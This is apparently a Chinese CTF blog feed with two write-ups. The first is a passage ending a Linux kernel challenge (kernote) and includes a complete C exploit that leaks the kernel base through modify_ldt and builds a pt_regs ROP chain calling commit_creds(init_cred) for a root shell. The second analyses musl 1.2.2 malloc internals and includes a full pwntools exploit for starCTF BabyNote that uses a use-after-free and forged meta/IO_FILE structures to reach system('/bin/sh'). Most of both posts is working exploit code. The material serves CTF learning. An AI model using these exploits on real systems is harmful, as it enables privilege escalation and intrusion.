&amp;kernel_base, 8);        exit(0);    &#125;    wait(NULL);    read(pipe_fd[0], &amp;kernel_base, 8);    if (kernel_base)    &#123;        kernel_offset = kernel_base - vmlinux_base;        break;    &#125;    search_addr += 0x1000;    *(unsigned long long *)buf = search_addr;&#125;\n\n下一步就跟刚刚一样我们要进行ROP，但是这道题恶心的地方的来了，这里开启了smap所以我们没法向上一道题目那样直接将ROP写在用户态，所以这里需要借助一个结构体pt_regs：\nstruct pt_regs &#123;    /* * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;. */    unsigned long r15;    unsigned long r14;    unsigned long r13;    unsigned long r12;    unsigned long rbp;    unsigned long rbx;    /* These regs are callee-clobbered. Always saved on kernel entry. */    unsigned long r11;    unsigned long r10;    unsigned long r9;    unsigned long r8;    unsigned long rax;    unsigned long rcx;    unsigned long rdx;    unsigned long rsi;    unsigned long rdi;    /* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it&#x27;s IRQ number: */    unsigned long orig_rax;    /* Return frame for iretq */    unsigned long rip;    unsigned long cs;    unsigned long eflags;    unsigned long rsp;    unsigned long ss;    /* top of stack page */&#125;;\n\n可以看到这个结构体的所有成员都是以寄存器命名的，并且内核中处理系统调用的入口函数entry_SYSCALL_64的源码中存在一条这样的指令：\nPUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy\n\n这条指令会将所有寄存器压入进内核的栈中，形成一个pt_reg结构体：\n\n当我们劫持内核结构体中的某个函数指针时，在我们通过该函数指针劫持内核执行流时 rsp 与 栈底的相对偏移通常是不变的，而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，这些寄存器为我们布置 ROP 链提供了可能。\n综上，得出exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;void save_status()&#123;    __asm__(&quot;mov user_cs, cs\\n&quot;            &quot;mov user_ss, ss\\n&quot;            &quot;mov user_sp, rsp\\n&quot;            &quot;pushf\\n&quot;            &quot;pop user_rflags\\n&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            printf(&quot;%d&quot;, i / 2);        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;void get_shell()&#123;    system(&quot;/bin/sh&quot;);&#125;struct user_desc&#123;    unsigned int entry_number;    unsigned int base_addr;    unsigned int limit;    unsigned int seg_32bit : 1;    unsigned int contents : 2;    unsigned int read_exec_only : 1;    unsigned int limit_in_pages : 1;    unsigned int seg_not_present : 1;    unsigned int useable : 1;    unsigned int lm : 1;&#125;;int fd;size_t user_cs, user_ss, user_rflags, user_sp;unsigned long add_rsp_pop_pop;unsigned long pop_rdi;unsigned long init_cred;unsigned long commit_creds;unsigned long swapgs;unsigned long iretq;unsigned long shell_addr;unsigned long swapgs_restore_regs_and_return_to_usermode;int seq_fd;void create(unsigned long idx)&#123;    ioctl(fd, 0x6667, idx);&#125;void delete (unsigned long idx)&#123;    ioctl(fd, 0x6668, idx);&#125;void select(unsigned long idx)&#123;    ioctl(fd, 0x6666, idx);&#125;void edit(unsigned long buf)&#123;    ioctl(fd, 0x6669, buf);&#125;int main()&#123;    signal(SIGSEGV, get_shell);    save_status();    fd = open(&quot;/dev/kernote&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[*]Error!&quot;);        exit(0);    &#125;    char *buf[0x100];    char *tmp[0x100];    unsigned long *info = malloc(0x2000);    unsigned long vmlinux_base = 0xffffffff81000000;    memset(info, 0, 0x2000);    unsigned long kernel_base = 0;    unsigned long kernel_offset;    int pipe_fd[2] = &#123;0&#125;;    struct user_desc desc;    desc.base_addr = 0xff0000;    desc.entry_number = 0x1000 / 8;    desc.limit = 0;    desc.seg_32bit = 0;    desc.contents = 0;    desc.read_exec_only = 0;    desc.limit_in_pages = 0;    desc.seg_not_present = 0;    desc.useable = 0;    desc.lm = 0;    create(0);    select(0);    delete (0);    syscall(SYS_modify_ldt, 1, &amp;desc, sizeof(desc));    memset(buf, 0, 0x100);    unsigned long long addr = 0xffff888000000000;    *(unsigned long *)buf = addr;    while (1)    &#123;        edit(*(unsigned long *)buf);        int ret = syscall(SYS_modify_ldt, 0, tmp, 8);        if (ret &lt; 0)        &#123;            addr += 0x40000000;            *(uint64_t *)buf = addr;            continue;        &#125;        printf(&quot;page_offset_base: %p\\n&quot;, addr);        break;    &#125;    unsigned long search_addr = addr;    *(unsigned long long *)buf = search_addr;    pipe(pipe_fd);    while (1)    &#123;        edit(*(unsigned long *)buf);        if (!fork())        &#123;            syscall(SYS_modify_ldt, 0, info, 0x1000);            for (int i = 0; i &lt; 0x1000 / 8; i++)            &#123;                if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)                &#123;                    kernel_base = info[i] - 0x40;                    kernel_offset = kernel_base - vmlinux_base;                    printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);                    printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);                &#125;            &#125;            write(pipe_fd[1], &amp;kernel_base, 8);            exit(0);        &#125;        wait(NULL);        read(pipe_fd[0], &amp;kernel_base, 8);        if (kernel_base)        &#123;            kernel_offset = kernel_base - vmlinux_base;            break;        &#125;        search_addr += 0x1000;        *(unsigned long long *)buf = search_addr;    &#125;    create(1);    select(1);    delete (1);    seq_fd = open(&quot;/proc/self/stat&quot;, 0);    add_rsp_pop_pop = 0xffffffff817c21a6 + kernel_offset;    pop_rdi = 0xffffffff81075c4c + kernel_offset;    init_cred = 0xffffffff8266b780 + kernel_offset;    commit_creds = 0xffffffff810c9dd0 + kernel_offset;    swapgs = 0xffffffff81078130 + kernel_offset;    iretq = 0xffffffff810002df + kernel_offset;    swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00fba + kernel_offset;    shell_addr = (uint64_t)get_shell;    edit(add_rsp_pop_pop);    __asm__(        &quot;mov r15,   0xbeefdead\\n&quot;        &quot;mov r14,   0xbeefdead\\n&quot;        &quot;mov r13,   pop_rdi\\n&quot;        &quot;mov r12,   init_cred\\n&quot;        &quot;mov rbp,   commit_creds\\n&quot;        &quot;mov rbx,   swapgs_restore_regs_and_return_to_usermode\\n&quot;        &quot;mov r11,   0xbeefdead\\n&quot;        &quot;mov r10,   0xbeefdead\\n&quot;        &quot;mov r9,    0xbeefdead\\n&quot;        &quot;mov r8,    0xbeefdead\\n&quot;        &quot;xor rax,   rax\\n&quot;        &quot;mov rcx,   0xbeefdead\\n&quot;        &quot;mov rdx,   8\\n&quot;        &quot;mov rsi,   rsp\\n&quot;        &quot;mov rdi,   seq_fd\\n&quot;        &quot;syscall&quot;);    return 0;&#125;\n\n\n题目放在：https://github.com/196082/196082\n\n参考链接：https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#Step-I-%E6%B3%84%E9%9C%B2-page-offset-base-1\n","categories":["Linux Kernel"],"tags":["seq_operations","modify_ldt","pt_regs","bypass kpti"]},{"title":"musl1.2.2源码分析+starCTF-BabyNote复现","url":"/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/","content":"源码分析数据结构这里根据我参考的文章来进行分析，chunk-&gt;group-&gt;mate\nchunk这里其实是没有定义chunk这个结构的，不过根据效果可以推断出来\nchunk关于0x10字节对其，如果是group中的第一个chunk，p的前0x10字节作为group结构体的头部，包括meta地址等。如果不是第一个chunk，只有前4字节作为元数据，包括了idx和offset，用来计算与该chunk与group地址的偏移。如果该chunk被释放，idx会被写为0xff，offset为0。idx和offset的作用就是free时根据chunk地址找到该group对应meta的地址，也为漏洞利用做了铺垫。\nstruct chunk&#123; char prev_user_data[];    uint8_t idx;  //低5bit为idx第几个chunk    uint16_t offset; //与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT    char data[];&#125;;\n\ngroup在musl中一个meta管理的内存区域用group表示，一个meta对应一个group。group中存放size相同的相邻chunk，通过idx和offset索引。\nstruct group &#123;    struct meta *meta;// meta的地址    unsigned char active_idx:5;    char pad[UNIT - sizeof(struct meta *) - 1];// 保证0x10字节对齐    unsigned char storage[];# chunk&#125;;\n\n通过chunk获取group地址\nstatic inline struct meta *get_meta(const unsigned char *p)&#123;    assert(!((uintptr_t)p &amp; 15));    int offset = *(const uint16_t *)(p - 2);    int index = get_slot_index(p);    if (p[-4]) &#123;        assert(!offset);        offset = *(uint32_t *)(p - 8);        assert(offset &gt; 0xffff);    &#125;    const struct group *base = (const void *)(p - UNIT*offset - UNIT);  ... ...&#125;\n\n最终就是：\ngroup_addr = chunk_addr - 0x10 * offset - 0x10\n\nmetastruct meta &#123;    struct meta *prev, *next;//双向链表    struct group *mem;// 这里指向管理的group 地址    volatile int avail_mask, freed_mask;    uintptr_t last_idx:5; //group中chunk数    uintptr_t freeable:1;    uintptr_t sizeclass:6; //管理group大小    uintptr_t maplen:8*sizeof(uintptr_t)-12;&#125;;\n\n其中如果这个meta 前后都没有，那么它的prev next 就指向它自己\navail_mask和freed_mask以bitmap方式表示group中chunk的状态\nmeta_arenastruct meta_area &#123;    uint64_t check;    struct meta_area *next;    int nslots;    struct meta slots[];&#125;;\n\n在内存页起始地址，是多个meta的集合，这样是为了meta &amp; 0xffffffffffff000就能找到meta_arena结构体。\n结构体中比较重要的就是check，Musl为了保证meta不被伪造，会验证meta_arena中的check是否与malloc_context中的secret相等。\nmalloc_contextstruct malloc_context &#123;    uint64_t secret;//也就是用于和meta_area验证的值#ifndef PAGESIZE    size_t pagesize;#endif    int init_done;    unsigned mmap_counter;    struct meta *free_meta_head;//释放的meta    struct meta *avail_meta;//可用分配的meta    size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift;    struct meta_area *meta_area_head, *meta_area_tail;    unsigned char *avail_meta_areas;    struct meta *active[48];//可以分配的meta地址，idx与size相关    size_t usage_by_class[48];//所有meta的group管理chunk数量    uint8_t unmap_seq[32], bounces[32];    uint8_t seq;    uintptr_t brk;&#125;;\n\nmalloc和free的源码分析mallocvoid *malloc(size_t n)&#123;\tif (size_overflows(n)) return 0;\tstruct meta *g;\tuint32_t mask, first;\tint sc;\tint idx;\tint ctr;\tif (n &gt;= MMAP_THRESHOLD) &#123;\t\tsize_t needed = n + IB + UNIT;\t\tvoid *p = mmap(0, needed, PROT_READ|PROT_WRITE,\t\t\tMAP_PRIVATE|MAP_ANON, -1, 0);\t\tif (p==MAP_FAILED) return 0;\t\twrlock();\t\tstep_seq();\t\tg = alloc_meta();\t\tif (!g) &#123;\t\t\tunlock();\t\t\tmunmap(p, needed);\t\t\treturn 0;\t\t&#125;\t\tg-&gt;mem = p;\t\tg-&gt;mem-&gt;meta = g;\t\tg-&gt;last_idx = 0;\t\tg-&gt;freeable = 1;\t\tg-&gt;sizeclass = 63;\t\tg-&gt;maplen = (needed+4095)/4096;\t\tg-&gt;avail_mask = g-&gt;freed_mask = 0;\t\t// use a global counter to cycle offset in\t\t// individually-mmapped allocations.\t\tctx.mmap_counter++;\t\tidx = 0;\t\tgoto success;\t&#125;// 这上面就是验证是否超过最大size以及是否使用mmap进行申请空间\tsc = size_to_class(n);// 将size转化成对应的size_classes的下标\trdlock();\tg = ctx.active[sc];// 取出对应sc的meta\t// use coarse size classes initially when there are not yet\t// any groups of desired size. this allows counts of 2 or 3\t// to be allocated at first rather than having to start with\t// 7 or 5, the min counts for even size classes.    // 没找到对应的meta 会执行下面的if语句\tif (!g &amp;&amp; sc&gt;=4 &amp;&amp; sc&lt;32 &amp;&amp; sc!=6 &amp;&amp; !(sc&amp;1) &amp;&amp; !ctx.usage_by_class[sc]) &#123;\t\tsize_t usage = ctx.usage_by_class[sc|1];\t\t// if a new group may be allocated, count it toward\t\t// usage in deciding if we can use coarse class.\t\tif (!ctx.active[sc|1] || (!ctx.active[sc|1]-&gt;avail_mask\t\t    &amp;&amp; !ctx.active[sc|1]-&gt;freed_mask))\t\t\tusage += 3;\t\tif (usage &lt;= 12)\t\t\tsc |= 1;\t\tg = ctx.active[sc];\t&#125;\tfor (;;) &#123;// 寻找对应size的maeta的group可用的chunk\t\tmask = g ? g-&gt;avail_mask : 0;\t\tfirst = mask&amp;-mask;\t\tif (!first) break;\t\tif (RDLOCK_IS_EXCLUSIVE || !MT)\t\t\tg-&gt;avail_mask = mask-first;\t\telse if (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)\t\t\tcontinue;\t\tidx = a_ctz_32(first);\t\tgoto success;\t&#125;\tupgradelock();\tidx = alloc_slot(sc, n);// 使用alloc_slot寻找idx\tif (idx &lt; 0) &#123;\t\tunlock();\t\treturn 0;\t&#125;\tg = ctx.active[sc];success:\tctr = ctx.mmap_counter;\tunlock();\treturn enframe(g, idx, n, ctr);// 取出chunk&#125;\n\n下面总结一下：\n 1. 首先是判断size，是否超过限制，或者是否超过阀值\n 2. 若是size没有超过阀值，则会在active里找对应size的meta\n 3. 如果active对应size的meta 位置上为空，没找到那么尝试先找size更大的meta\n 4. 如果active对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk\n 5. 如果有空闲的chunk，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr);\n 6. 从对应meta 中的group 取出 第idx号chunk分配\n 7. 如果没有，break 跳出循环\n 8. 跳出循环后执行`idx = alloc_slot(sc, n);`\n     1. 使用group中被free的chunk\n     2. 从队列中其他meta的group 中找\n     3. 如果都不行就重新分配一个新的group 对应一个新的meta\n 9. enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk\n\nfreevoid free(void *p)&#123;\tif (!p) return;\tstruct meta *g = get_meta(p);// 得到chunk对应的meta\tint idx = get_slot_index(p);// 得到idx\tsize_t stride = get_stride(g);// 找到size_classes中对应chunk的size\tunsigned char *start = g-&gt;mem-&gt;storage + stride*idx;\tunsigned char *end = start + stride - IB;\tget_nominal_size(p, end);// 算出chunk的真实大小\tuint32_t self = 1u&lt;&lt;idx, all = (2u&lt;&lt;g-&gt;last_idx)-1;\t((unsigned char *)p)[-3] = 255;\t// invalidate offset to group header, and cycle offset of\t// used region within slot if current offset is zero.\t*(uint16_t *)((char *)p-2) = 0;\t// release any whole pages contained in the slot to be freed\t// unless it&#x27;s a single-slot group that will be unmapped.\tif (((uintptr_t)(start-1) ^ (uintptr_t)end) &gt;= 2*PGSZ &amp;&amp; g-&gt;last_idx) &#123;\t\tunsigned char *base = start + (-(uintptr_t)start &amp; (PGSZ-1));\t\tsize_t len = (end-base) &amp; -PGSZ;\t\tif (len) madvise(base, len, MADV_FREE);\t&#125;\t// atomic free without locking if this is neither first or last slot\tfor (;;) &#123;\t\tuint32_t freed = g-&gt;freed_mask;\t\tuint32_t avail = g-&gt;avail_mask;\t\tuint32_t mask = freed | avail; // 将free的chunk加进去\t\tassert(!(mask&amp;self));\t\tif (!freed || mask+self==all) break;\t\tif (!MT)\t\t\tg-&gt;freed_mask = freed+self;\t\telse if (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)\t\t\tcontinue;\t\treturn;\t&#125;\twrlock();\tstruct mapinfo mi = nontrivial_free(g, idx);\tunlock();\tif (mi.len) munmap(mi.base, mi.len);&#125;\n\n总结一下：\n 1. 通过get_meta(p)得到meta，通过get_slot_index(p)得到对应chunk的 idx -&gt; 通过get_nominal_size(p, end) 算出真实大小\n 2. 重置idx 和 offset idx 被置为0xff 标记chunk， 修改freed_mask 标记chunk被释放\n 3. 最后调用nontrivial_free 完成关于meta一些剩余操作\n\n\n仔细观察分配的过程，我们也可以看出为什么free 的chunk不能立即回收使用，因为有空闲的chunk的时候，分配chunk是直接设置meta-&gt;avail_mask\n然后直接enframe() 直接从group中取出 chunk即可，不会设置meta-&gt;freed\n\nstatic inline struct meta *get_meta(const unsigned char *p)&#123;\tassert(!((uintptr_t)p &amp; 15));\tint offset = *(const uint16_t *)(p - 2);\tint index = get_slot_index(p);\tif (p[-4]) &#123;\t\tassert(!offset);\t\toffset = *(uint32_t *)(p - 8);\t\tassert(offset &gt; 0xffff);\t&#125;\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);// 通过offset 和chunk 地址计算出group地址\tconst struct meta *meta = base-&gt;meta;// 得到meta地址\tassert(meta-&gt;mem == base);// 检查meta 是否指向对应的group\tassert(index &lt;= meta-&gt;last_idx);// 检查chunk idx 是否超过 meta 最大chunk 容量\tassert(!(meta-&gt;avail_mask &amp; (1u&lt;&lt;index)));\tassert(!(meta-&gt;freed_mask &amp; (1u&lt;&lt;index)));\tconst struct meta_area *area = (void *)((uintptr_t)meta &amp; -4096);// 得到meta_area 地址\tassert(area-&gt;check == ctx.secret);// 检查 check 校验值\tif (meta-&gt;sizeclass &lt; 48) &#123;// 检查是否属于 sizeclasses 管理的chunk 大小\t\tassert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);\t\tassert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+1));\t&#125; else &#123;\t\tassert(meta-&gt;sizeclass == 63);\t&#125;\tif (meta-&gt;maplen) &#123;\t\tassert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);\t&#125;\treturn (struct meta *)meta;&#125;\n\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)&#123;\tuint32_t self = 1u&lt;&lt;i;\tint sc = g-&gt;sizeclass;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\tif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) &#123;        // 要么释放要么可用，且该meta可以被释放\t\t// any multi-slot group is necessarily on an active list\t\t// here, but single-slot groups might or might not be.\t\tif (g-&gt;next) &#123;            // 如果队列中 有下一个meta\t\t\tassert(sc &lt; 48);\t\t\tint activate_new = (ctx.active[sc]==g);\t\t\tdequeue(&amp;ctx.active[sc], g);            // 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\t\t\t\tactivate_group(ctx.active[sc]);\t\t&#125;\t\treturn free_group(g);\t&#125; else if (!mask) &#123;\t\tassert(sc &lt; 48);\t\t// might still be active if there were no allocations\t\t// after last available slot was taken.\t\tif (ctx.active[sc] != g) &#123;\t\t\tqueue(&amp;ctx.active[sc], g);\t\t&#125;\t&#125;\ta_or(&amp;g-&gt;freed_mask, self);\treturn (struct mapinfo)&#123; 0 &#125;;&#125;\n\nstatic inline void dequeue(struct meta **phead, struct meta *m)&#123;\tif (m-&gt;next != m) &#123;\t\tm-&gt;prev-&gt;next = m-&gt;next;\t\tm-&gt;next-&gt;prev = m-&gt;prev;\t\tif (*phead == m) *phead = m-&gt;next;\t&#125; else &#123;\t\t*phead = 0;\t&#125;\tm-&gt;prev = m-&gt;next = 0;&#125;\n\n这里存在不安全的解链操作了\n可以看到没有任何的安全检测就直接往prev写入值了。那么这里进入到dequeue的条件主要有两点：\n\n第一种:如果一个group 中所有的chunk 都已经被使用，且没有free掉的chunk\n第二种:group 中的chunk 当free掉最后一个chunk，都处于freed的状态\n\nBabyNote题目分析这道题的逆向过程也不是很难，可以知道题目维护的是一个单链表的结构\n在比赛期间没发现这道题的漏洞，看了wp发现我少考虑了一种极端情况\nunsigned __int64 sub_16A1()&#123;  void *v1; // [rsp+8h] [rbp-28h] BYREF  __int64 *i; // [rsp+10h] [rbp-20h]  __int64 v3; // [rsp+18h] [rbp-18h]  void *ptr; // [rsp+20h] [rbp-10h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  v1 = 0LL;  v3 = give_name((__int64 *)&amp;v1);  ptr = (void *)_int_find(v1, v3);  if ( ptr )  &#123;    if ( ptr != (void *)chunk_start || *(_QWORD *)(chunk_start + 0x20) )    &#123;      if ( *((_QWORD *)ptr + 4) )      &#123;        for ( i = &amp;chunk_start; ptr != (void *)*i; i = (__int64 *)(*i + 0x20) )          ;        *i = *((_QWORD *)ptr + 4);      &#125;    &#125;    else    &#123;      chunk_start = 0LL;    &#125;    free(*(void **)ptr);    free(*((void **)ptr + 1));    free(ptr);    puts(&quot;ok&quot;);  &#125;  else  &#123;    puts(&quot;oops.....&quot;);  &#125;  free(v1);  return __readfsqword(0x28u) ^ v5;&#125;unsigned __int64 sub_16A1()&#123;  void *v1; // [rsp+8h] [rbp-28h] BYREF  __int64 *i; // [rsp+10h] [rbp-20h]  __int64 v3; // [rsp+18h] [rbp-18h]  void *ptr; // [rsp+20h] [rbp-10h]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  v1 = 0LL;  v3 = give_name((__int64 *)&amp;v1);  ptr = (void *)_int_find(v1, v3);  if ( ptr )  &#123;    if ( ptr != (void *)chunk_start || *(_QWORD *)(chunk_start + 0x20) )    &#123;      if ( *((_QWORD *)ptr + 4) )      &#123;        for ( i = &amp;chunk_start; ptr != (void *)*i; i = (__int64 *)(*i + 0x20) )          ;        *i = *((_QWORD *)ptr + 4);      &#125;    &#125;    else    &#123;      chunk_start = 0LL;    &#125;    free(*(void **)ptr);    free(*((void **)ptr + 1));    free(ptr);    puts(&quot;ok&quot;);  &#125;  else  &#123;    puts(&quot;oops.....&quot;);  &#125;  free(v1);  return __readfsqword(0x28u) ^ v5;&#125;\n\n也就是当最后一个结点(也是第一个生成的结点)被删除的时候，倒数第二个结点(也就是第二个生成的结点)的next指针还是会指向最后一个结点，这也就造成了UAF\n利用过程首先生成UAF的chunk\ncreate(0x38, b&#x27;a&#x27; * 0x38, 0x28, b&#x27;a&#x27; * 0x28)create(0x38, b&#x27;b&#x27; * 0x38, 0x38, b&#x27;b&#x27; * 0x38)delete(0x38, b&#x27;a&#x27; * 0x38)\n\n\n可以看到其实已经是造成了UAF了\n这个时候我们如果在free的chunk这里生成一个管理堆块即可泄漏出堆地址，但是上面提到了musl在free后不会直接该表avail的值，而是等avail用完了才会根据freed修改avail。\n\n可以看到当前的meta，题目的show函数也是会创建chunk然后free掉的，所以修改掉即可。\nfor i in range(7):    find(0x28, b&#x27;a&#x27; * 0x28)\n\n\n那么下一次申请的管理堆块就会是我们上面的内容堆块\n我发现如果单纯的按照上面的操作会出现后面生成的管理堆会覆盖掉以前的管理堆导致破坏了UAF，所以我在前面新增了一段代码\ncreate(0x38, b&#x27;d&#x27; * 0x38, 0x38, b&#x27;d&#x27; * 0x38)for i in range(8):    find(0x28, b&#x27;a&#x27; * 0x28)\n\n\n从而达到这种效果，使我们造成UAF的管理堆块在group的最后，避免覆盖\n\n接着进行上面的步骤即可实现这一效果\n\n紧接着泄漏地址\n根据上面描述的，我们最终利用的其实是dequeue当中的任意地址写，但是在进入这个函数之前会检测secrt值，所以我们还需要泄漏一次，这次泄漏的思路和上面差不多，这里可以通过show函数修改掉我们最开始管理堆块即可进行泄漏。\n到这里已经泄漏完所有的东西了，下一步就是伪造IO_FILE进行FSOP来getshell了\nexpfrom pwn import *r = process(&#x27;babynote&#x27;)elf = ELF(&#x27;babynote&#x27;)libc = ELF(&#x27;libc.so&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(name_size, name, note_size, note):    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;name size: &#x27;)    r.sendline(bytes(str(name_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name: &#x27;)    r.send(name)    r.recvuntil(b&#x27;note size: &#x27;)    r.sendline(bytes(str(note_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;note content: &#x27;)    r.send(note)def find(name_size, name):    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;name size: &#x27;)    r.sendline(bytes(str(name_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name: &#x27;)    r.send(name)def delete(name_size, name):    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;name size: &#x27;)    r.sendline(bytes(str(name_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;name: &#x27;)    r.send(name)def forget():    r.recvuntil(b&#x27;option: &#x27;)    r.sendline(b&#x27;4&#x27;)create(0x38, b&#x27;d&#x27; * 0x38, 0x38, b&#x27;d&#x27; * 0x38)for i in range(8):    find(0x28, b&#x27;1&#x27; * 0x28)forget()create(0x38, b&#x27;a&#x27; * 0x38, 0x28, b&#x27;a&#x27; * 0x28)create(0x38, b&#x27;b&#x27; * 0x38, 0x38, b&#x27;b&#x27; * 0x38)delete(0x38, b&#x27;a&#x27; * 0x38)for i in range(6):    find(0x28, b&#x27;a&#x27; * 0x28)create(0x38, b&#x27;c&#x27; * 0x38, 0x58, b&#x27;c&#x27; * 0x58)find(0x38, b&#x27;a&#x27; * 0x38)r.recvuntil(b&#x27;0x28:&#x27;)elf_base = b&#x27;&#x27;libc_base = b&#x27;&#x27;for i in range(6):    elf_base = r.recv(2) + elf_baser.recv(4)for i in range(6):    libc_base = r.recv(2) + libc_baseelf_base = int(elf_base, base=16) - 0x4dc0libc_base = int(libc_base, base=16) - 0xb7870print(hex(elf_base))print(hex(libc_base))__malloc_context = libc_base + 0xb4ac0for i in range(6):    find(0x28, b&#x27;a&#x27; * 0x28)payload = flat(elf_base + 0x4cc0, __malloc_context, 0x38, 0x28, 0)find(0x28, payload)find(0x38, b&#x27;a&#x27; * 0x38)r.recvuntil(b&#x27;0x28:&#x27;)secret = b&#x27;&#x27;for i in range(8):    secret = r.recv(2) + secretsecret = int(secret, base=16)print(hex(secret))__stdout_used = libc_base + 0xb43b0heap_addr = libc_base - 0x7000system = libc_base + libc.symbols[&#x27;system&#x27;]fake_area_addr = heap_addr + 0x1000fake_meta_addr = fake_area_addr + 0x10fake_group_addr = fake_meta_addr + 0x30fake_IO_FILE_addr = fake_group_addr + 0x10fake_meta_area = flat(secret, 0)fake_meta = flat(fake_IO_FILE_addr, __stdout_used, fake_group_addr, (1 &lt;&lt; 1),                 (20 &lt;&lt; 6) | (1 &lt;&lt; 5) | 1 | (0xfff &lt;&lt; 12))fake_meta = fake_meta.ljust(0x30)fake_group = flat(fake_meta_addr, 0)fake_IO_FILE = b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27; * 0x20 + p64(0xdeadbeef) + b&#x27;X&#x27; * 8 + p64(    0xbeefdead) + p64(system) * 2fake_IO_FILE = fake_IO_FILE.ljust(0x500, b&quot;\\x00&quot;)payload = b&#x27;a&#x27; * (    0x1000 - 0x20) + fake_meta_area + fake_meta + fake_group + fake_IO_FILEpayload = payload.ljust(0x2000, b&quot;z&quot;)context.log_level = &#x27;debug&#x27;create(0x38, b&#x27;e&#x27; * 0x38, 0x2000, payload)fake_name_addr = elf_base + 0x4d80fake_note = flat(fake_name_addr, fake_IO_FILE_addr, 0x38, 0x38, 0)fake_note_addr = libc_base + 0xb7d50create(0x4, b&#x27;f&#x27; * 0x4, 0x28, fake_note)create(0x4, b&#x27;g&#x27; * 0x4, 0x38, b&#x27;h&#x27; * 0x38)find(0x28, b&#x27;a&#x27; * 0x28)find(0x28, b&#x27;a&#x27; * 0x28)payload = flat(elf_base + 0x4cc0, __malloc_context, 0x38, 0x28, fake_note_addr)find(0x28, payload)delete(0x38, b&#x27;h&#x27; * 0x38)r.recvuntil(b&#x27;option: &#x27;)r.sendline(b&#x27;5&#x27;)# gdb.attach(#     r,#     &#x27;dir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc\\ndir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc/mallocng\\nb free&#x27;# )r.interactive()\n\n构造meta这里再继续花上一点篇幅讲解一下怎么构造meta，其实看别人博客也把我看晕了，自己对照源码然后调试发现并不难，所以我的exp也就整体进行了缩减。\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)&#123;\tuint32_t self = 1u&lt;&lt;i;\tint sc = g-&gt;sizeclass;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\tif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) &#123;\t\t// any multi-slot group is necessarily on an active list\t\t// here, but single-slot groups might or might not be.\t\tif (g-&gt;next) &#123;\t\t\tassert(sc &lt; 48);\t\t\tint activate_new = (ctx.active[sc]==g);\t\t\tdequeue(&amp;ctx.active[sc], g);\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\t\t\t\tactivate_group(ctx.active[sc]);\t\t&#125;\t\treturn free_group(g);\t&#125;    ... 